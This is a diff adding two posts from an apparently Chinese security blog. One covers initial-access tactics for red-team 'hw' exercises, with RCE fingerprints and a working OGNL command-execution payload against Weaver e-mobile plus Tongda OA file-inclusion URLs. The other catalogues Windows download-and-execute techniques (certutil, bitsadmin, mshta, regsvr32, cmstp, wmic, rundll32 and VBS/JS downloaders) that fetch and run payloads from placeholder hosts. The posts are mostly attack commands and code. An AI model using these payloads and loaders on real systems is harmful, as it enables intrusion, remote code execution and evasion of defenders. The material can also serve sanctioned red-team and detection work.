@@ -142,6 +142,297 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
+    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/08/21/%E5%85%B3%E4%BA%8Ehw%E6%89%93%E7%82%B9%E7%9A%84%E6%80%9D%E8%80%83/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="藏青">
+      <meta itemprop="description" content="知行合一">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="藏青's BLOG">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/08/21/%E5%85%B3%E4%BA%8Ehw%E6%89%93%E7%82%B9%E7%9A%84%E6%80%9D%E8%80%83/" class="post-title-link" itemprop="url">关于hw打点的思考</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2020-08-21 09:26:01 / Modified: 09:31:11" itemprop="dateCreated datePublished" datetime="2020-08-21T09:26:01+08:00">2020-08-21</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>​            一年一度的hw活动又开始了，关于hw的比拼，各个公司都十分看重，都希望能在这次比赛中拿到一个比较好的成绩，针对于hw这种形式，还是比较考验一个人或者一个团队的梭哈能力，有些红队人员虽然内网非常强，姿势也非常骚，可是打点可能不是很快，对于这种比赛来讲，就是手慢则无。反而一把梭哈，速度快还能拿到比较不错的成绩。下面我根据我的不成熟的经验来分析一下，如何提升速度。</p>
+<p>​            首先是信息搜集的能力，我们可以想一下，如果一个攻击队，信息搜集非常慢，半天才找到不多的资产，然后再去做一些常规的rce的测试，和那些有自动化工具的队伍比起来就慢了一大截，因此hw还是比较考验队伍快速搜集资产的能力，否则即使0day在手，找不到对应的平台也没用啊。关于自动化信息搜集的工具，其实可以借助一些网络资产搜集引擎，因为hw的很多蓝方精神都是高度集中，你扫个端口肯定就被拌掉了，因此最好在搜集的时候能不直接和这些目标接触并且能拿到我们想要的信息。这里我提供一个思路，就是调用各种接口搜集资产信息，找到以后再去验证存活，再获取一些指纹信息，比如网站的架构，什么cms，用了什么中间件，这些信息对我们打点来说都是非常重要的。</p>
+<p>​            然后再来谈谈挖洞，其实hw这些目标都挺大的，也就是说资产比较多，有新架构有老架构，用这种框架中间件的也非常多。那当我们拿到这么多资产后，我们该如何快速打点呢？</p>
+<p>​            我认为首先应该去找各种影响比较大的rce去检测</p>
+<p><strong>java站</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">weblogic rce  根据404报错的那个标题即可识别是否是weblogic</span><br><span class="line">struts rce		有人写了识别工具，也可以根据后缀比如.do，.action</span><br><span class="line">spring boot rce 根据404或者500的报错页面进行识别，找env文件</span><br><span class="line">shior rce       找java的登录口，看返回结果是否有remeberme 之类的字段</span><br></pre></td></tr></table></figure>
+
+<p><strong>php站</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">thinkphp rce thinkphp可以根据路由来进行识别</span><br><span class="line">解析漏洞   1.jgp&#x2F;1.php</span><br></pre></td></tr></table></figure>
+
+<p><strong>asp/aspx</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ueditor任意文件上传  扫ueditor的目录</span><br></pre></td></tr></table></figure>
+
+<p>​        当没有这些影响比较大的漏洞时，我们再去考虑一些cms或者一些oa这种我们知道某些版本有漏洞的站，最好还是那种已知有rce的cms。这个其实也比较依赖于大家的经验和总结能力，毕竟要跟一些爆发的漏洞也挺费精力的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">通达：</span><br><span class="line">漏洞指纹：&#x2F;ispirit&#x2F;interface&#x2F;gateway.php 文件包含漏洞</span><br><span class="line">ispirit&#x2F;interface&#x2F;gateway.php?json&#x3D;&#123;&quot;url&quot;:&quot;&#x2F;general&#x2F;..&#x2F;..&#x2F;mysql5&#x2F;my.ini&quot;&#125;</span><br><span class="line">ispirit&#x2F;interface&#x2F;gateway.php?json&#x3D;&#123;&#125;&amp;url&#x3D;&#x2F;general&#x2F;..&#x2F;..&#x2F;nginx&#x2F;logs&#x2F;oa.access.log</span><br><span class="line">泛微：</span><br><span class="line">e-mobile常在89端口 rce</span><br><span class="line">访问login.do post如下内容：</span><br><span class="line">message&#x3D;(#_memberAccess&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()))).(#w.close())&amp;cmd&#x3D;whoami</span><br><span class="line">泛微rce &#x2F;weaver&#x2F;bsh.servlet.BshServlet 直接访问即可执行命令</span><br></pre></td></tr></table></figure>
+
+<p>​        当这些可以直接可以利用的rce无法利用时，我们就要去找一些cms可以通过组合可以getshell的站。这些如果还没有，那我们就需要去看那些他们自己开发的网站了。去找找后台，找找上传，找找注入等等。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
+    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="藏青">
+      <meta itemprop="description" content="知行合一">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="藏青's BLOG">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">windows文件下载方式总结</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-08-12 17:21:36" itemprop="dateCreated datePublished" datetime="2020-08-12T17:21:36+08:00">2020-08-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-08-21 17:34:59" itemprop="dateModified" datetime="2020-08-21T17:34:59+08:00">2020-08-21</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">好好学习，天天向上</span><br></pre></td></tr></table></figure>
+
+<p>​        我认为按照我们平时对于远程加载文件的需求，可以按照能否加载任意格式的文件来进行区分，有些下载方式，可以去远程下载任意格式的文件，比如exe,txt等等，但是有些则是有限制的，只能下载指定格式的文件，比如js，xls，msi等等。还有些方式也可以下载或者加载远程的文件，但是不是windows自带的方式，所以也可以把这种方式当作一种类型进行总结。最后还有一些方式不能通过http协议进行下载，但是可以通过smb协议进行下载文件，这也可以列为一种方式。</p>
+<h3 id="下载任意格式文件"><a href="#下载任意格式文件" class="headerlink" title="下载任意格式文件"></a>下载任意格式文件</h3><h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h4><p><strong>方法一：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell (new-object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;xxx:6666&#x2F;1.txt&#39;,&#39;C:\Windows\Temp\2.txt&#39;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200812213732096.png" alt="image-20200812213732096"></p>
+<p><strong>方法二：</strong></p>
+<pre><code>首先准备一个ps脚本，内容如下</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$Urls &#x3D; @()</span><br><span class="line">$Urls +&#x3D; &quot;http:&#x2F;&#x2F;xxx:6666&#x2F;foo.xsl&quot;</span><br><span class="line">$OutPath &#x3D; &quot;C:\Windows\Temp\&quot; </span><br><span class="line">ForEach ( $item in $Urls) &#123;</span><br><span class="line">$file &#x3D; $OutPath + ($item).split(&#39;&#x2F;&#39;)[-1]</span><br><span class="line">(New-Object System.Net.WebClient).DownloadFile($item, $file) </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        使用下面命令执行下载文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -File down.ps1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200812214929736.png" alt="image-20200812214929736"></p>
+<h4 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h4><p>​        用于备份证书服务，支持xp-win10都支持。由于certutil下载文件都会留下缓存，所以一般都建议下载完文件后对缓存进行删除。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;xxx:6666&#x2F;1.txt c:\windows\temp\test.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200820104905690.png" alt="image-20200820104905690"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;ccc:6666&#x2F;1.txt delete  删除缓存</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200820105120705.png" alt="image-20200820105120705"></p>
+<h4 id="bitsadmin"><a href="#bitsadmin" class="headerlink" title="bitsadmin"></a>bitsadmin</h4><p>​        bitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin &#x2F;transfer n http:&#x2F;&#x2F;xxxx:6666&#x2F;1.txt C:\Windows\Temp\3.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200820105507751.png" alt="image-20200820105507751"></p>
+<h4 id="vbs"><a href="#vbs" class="headerlink" title="vbs"></a>vbs</h4><p><strong>方法一：</strong></p>
+<p>​        可以使用vbs脚本来执行文件下载操作,vbs内容如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set a&#x3D;createobject(&quot;adod&quot;+&quot;b.stream&quot;):set w&#x3D;createobject(&quot;micro&quot;+&quot;soft.xmlhttp&quot;):w.open&quot;get&quot;,wsh.arguments(0),0:w.send:a.type&#x3D;1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2</span><br></pre></td></tr></table></figure>
+
+<p>​        再使用cscript加载该文件执行下载写入的功能</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript &#x2F;nologo downfile.vbs http:&#x2F;&#x2F;xxx:801&#x2F;1.txt c:\windows\temp\1.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821100115562.png" alt="image-20200821100115562"></p>
+<p>​        甚至也可以使用cmd先写入vbs文件，最后再调用vbs执行下载功能</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo set a&#x3D;createobject(^&quot;adod^&quot;+^&quot;b.stream^&quot;):set w&#x3D;createobject(^&quot;micro^&quot;+^&quot;soft.xmlhttp^&quot;):w.open^&quot;get^&quot;,wsh.arguments(0),0:w.send:a.type&#x3D;1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 &gt;&gt;downfile.vbs</span><br></pre></td></tr></table></figure>
+
+<p><strong>方法二：</strong></p>
+<p>​        还可以使用其他的下载vbs脚本文件执行下载功能，文件内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">strFileURL &#x3D; &quot;http:&#x2F;&#x2F;119.xxx.xxx.xxx&#x2F;1.txt&quot;</span><br><span class="line">strHDLocation &#x3D; &quot;1.txt&quot;</span><br><span class="line">Set objXMLHTTP &#x3D; CreateObject(&quot;MSXML2.XMLHTTP&quot;)</span><br><span class="line">objXMLHTTP.open &quot;GET&quot;, strFileURL, false</span><br><span class="line">objXMLHTTP.send()</span><br><span class="line">If objXMLHTTP.Status &#x3D; 200 Then</span><br><span class="line">Set objADOStream &#x3D; CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line">objADOStream.Open</span><br><span class="line">objADOStream.Type &#x3D; 1</span><br><span class="line">objADOStream.Write objXMLHTTP.ResponseBody</span><br><span class="line">objADOStream.Position &#x3D; 0</span><br><span class="line">Set objFSO &#x3D; CreateObject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class="line">If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation</span><br><span class="line">Set objFSO &#x3D; Nothing</span><br><span class="line">objADOStream.SaveToFile strHDLocation</span><br><span class="line">objADOStream.Close</span><br><span class="line">Set objADOStream &#x3D; Nothing</span><br><span class="line">End if</span><br><span class="line">Set objXMLHTTP &#x3D; Nothing</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821104803291.png" alt="image-20200821104803291"></p>
+<h4 id="js"><a href="#js" class="headerlink" title="js"></a>js</h4><p><strong>方法一：</strong></p>
+<p>​        首先准备一个js文件，文件内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">var objArgs &#x3D; WScript.Arguments;var sGet&#x3D;new ActiveXObject(&quot;ADODB.Stream&quot;);var xGet &#x3D; false;</span><br><span class="line">try &#123;</span><br><span class="line">xGet &#x3D; new XMLHttpRequest();</span><br><span class="line">&#125; </span><br><span class="line">catch (trymicrosoft) &#123;</span><br><span class="line">try &#123;</span><br><span class="line">    xGet &#x3D; new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);</span><br><span class="line">&#125; </span><br><span class="line">catch (othermicrosoft) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">      xGet &#x3D; new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">    &#125; </span><br><span class="line">catch (failed) &#123;</span><br><span class="line">      xGet &#x3D; false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">xGet.Open (&quot;GET&quot;,objArgs(0).toLowerCase(),0);xGet.Send();sGet.Mode&#x3D;3;sGet.Type&#x3D;1;sGet.Open();sGet.Write (xGet.ResponseBody);sGet.SaveToFile (objArgs(1).toLowerCase(),2);</span><br></pre></td></tr></table></figure>
+
+<p>​        通过cscript调用该文件执行下载操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript &#x2F;nologo down.js http:&#x2F;&#x2F;xxx:801&#x2F;1.txt c:\windows\temp\test123123.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821105402895.png" alt="image-20200821105402895"></p>
+<p><strong>方法二：</strong></p>
+<p>​        准备一个js文件，文件内容如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var WinHttpReq &#x3D; new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span><br><span class="line">WinHttpReq.Open(&quot;GET&quot;, WScript.Arguments(0), &#x2F;*async&#x3D;*&#x2F;false);</span><br><span class="line">WinHttpReq.Send();</span><br><span class="line">BinStream &#x3D; new ActiveXObject(&quot;ADODB.Stream&quot;); BinStream.Type &#x3D; 1;</span><br><span class="line">BinStream.Open(); BinStream.Write(WinHttpReq.ResponseBody);</span><br><span class="line">BinStream.SaveToFile(&quot;test12312223123.txt&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>​        执行如下命令进行下载文件操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript &#x2F;nologo down2.js http:&#x2F;&#x2F;xxx:801&#x2F;1.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821110118839.png" alt="image-20200821110118839"></p>
+<p><strong>注意</strong></p>
+<p>​        方法二这种文件下载方式有一些缺点，首先不能指定绝对路径，否则会写入失败，另外，文件名也不能和系统在该目录下已有的文件名冲突，否则也会写入失败。</p>
+<h4 id="certreq"><a href="#certreq" class="headerlink" title="certreq"></a>certreq</h4><p>​        在 Windows Server 2008 R2 上提供了 Microsoft certreq 实用程序，可使用该实用程序生成 CSR 和导入签名证书。下载命令如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CertReq -Post -config http:&#x2F;&#x2F;xxx:801&#x2F;1.txt c:\windows\win.ini c:\windows\temp\output.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821110958332.png" alt="image-20200821110958332"></p>
+<p>​        这个程序虽然可以下载任意形式的文件，但是又有两个限制，第一个限制就是在serever 2008 r2以上的系统。第二个就是长度限制，不能下载超过60k的文件。这种文件下载的方式如果文件存在也会报错，因此使用这种方式下载文件，文件名不能和已有的文件名相同。</p>
+<h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;from urllib import urlretrieve; urlretrieve(&#39;http:&#x2F;&#x2F;xxx:801&#x2F;1.txt&#39;, &#39;C:\\Windows\\Temp\\test8866.txt&#39;)&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821114745482.png" alt="image-20200821114745482"></p>
+<h4 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h4><h3 id="下载指定格式文件"><a href="#下载指定格式文件" class="headerlink" title="下载指定格式文件"></a>下载指定格式文件</h3><h4 id="msiexec"><a href="#msiexec" class="headerlink" title="msiexec"></a>msiexec</h4><p>​        使用msiexec可以下载并执行msi文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec &#x2F;q &#x2F;i http:&#x2F;&#x2F;xxxx:8011&#x2F;test666.msi</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821134222982.png" alt="image-20200821134222982"></p>
+<h4 id="mshta"><a href="#mshta" class="headerlink" title="mshta"></a>mshta</h4><p>​        mshta可以远程加载hta文件并执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta http:&#x2F;&#x2F;xxx.xxx.xxx.xxx:801&#x2F;download&#x2F;file.ext</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821134354798.png" alt="image-20200821134354798"></p>
+<h4 id="regsvr32"><a href="#regsvr32" class="headerlink" title="regsvr32"></a>regsvr32</h4><p>​        使用regsvr32可以远程加载并执行sct文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 &#x2F;u &#x2F;s &#x2F;i:http:&#x2F;&#x2F;xxx:8011&#x2F;test8866.sct scrobj.dll</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821135750174.png" alt="image-20200821135750174"></p>
+<h4 id="CMSTP"><a href="#CMSTP" class="headerlink" title="CMSTP"></a>CMSTP</h4><p>​    使用cmstp加载本地的inf文件，inf中再去加载远程的sct文件。</p>
+<p>inf中的内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[version]</span><br><span class="line">Signature&#x3D;$chicago$</span><br><span class="line">AdvancedINF&#x3D;2.5</span><br><span class="line">[DefaultInstall_SingleUser]</span><br><span class="line">UnRegisterOCXs&#x3D;UnRegisterOCXSection</span><br><span class="line">[UnRegisterOCXSection]</span><br><span class="line">%11%\scrobj.dll,NI,http:&#x2F;&#x2F;10.0.0.2&#x2F;tmp&#x2F;powersct.sct</span><br><span class="line">[Strings]</span><br><span class="line">AppAct &#x3D; &quot;SOFTWARE\Microsoft\Connection Manager&quot;</span><br><span class="line">ServiceName&#x3D;&quot;Pentestlab&quot;</span><br><span class="line">ShortSvcName&#x3D;&quot;Pentestlab&quot;</span><br></pre></td></tr></table></figure>
+
+<p>​        再使用如下命令加载inf文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmstp.exe &#x2F;s xxx.inf</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821140228440.png" alt="image-20200821140228440"></p>
+<p>​        使用这种方式加载并执行远程的文件有个缺陷，就是会在执行的目录下生成一个快捷方式文件还有一个cmp文件。</p>
+<h4 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h4><p>​        使用wmic可以加载并执行远程的xsl文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process get brief &#x2F;format:&quot;http:&#x2F;&#x2F;xxx:8080&#x2F;launcher.xsl&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821140727620.png" alt="image-20200821140727620"></p>
+<h4 id="WCS"><a href="#WCS" class="headerlink" title="WCS"></a>WCS</h4><p>​        首先创建一个js文件，文件内容如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetObject(&quot;script:http:&#x2F;&#x2F;xxxx:8011&#x2F;test.wsc&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>​        使用cscript执行js文件，加载并执行远程的wsc文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">csript  1.js</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821141107404.png" alt="image-20200821141107404"></p>
+<p>​        wsc文件中的内容如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;    </span><br><span class="line">&lt;package&gt;</span><br><span class="line">&lt;component id&#x3D;&quot;testCalc&quot;&gt;    </span><br><span class="line">&lt;script language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line">&lt;![CDATA[</span><br><span class="line">var r &#x3D; new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;); </span><br><span class="line">]]&gt;</span><br><span class="line">&lt;&#x2F;script&gt;    </span><br><span class="line">&lt;&#x2F;component&gt;</span><br><span class="line">&lt;&#x2F;package&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="rundll32"><a href="#rundll32" class="headerlink" title="rundll32"></a>rundll32</h4><p>​        rundll32本身并不能达到加载并且运行远程文件的目的，不过可以配合其他方式来下载远程文件并执行</p>
+<p>比如可以加载hta文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32 javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;C:&#x2F;Windows&#x2F;System32&#x2F;mshta.exe http:&#x2F;&#x2F;xxx.xxx.xxx.xxx:8011&#x2F;test.hta&quot;,0,true);self.close();</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821141739314.png" alt="image-20200821141739314"></p>
+<h3 id="非自带程序"><a href="#非自带程序" class="headerlink" title="非自带程序"></a>非自带程序</h3><h4 id="msxsl"><a href="#msxsl" class="headerlink" title="msxsl"></a>msxsl</h4><p>​        msxsl.exe可以去加载远程的xsl文件</p>
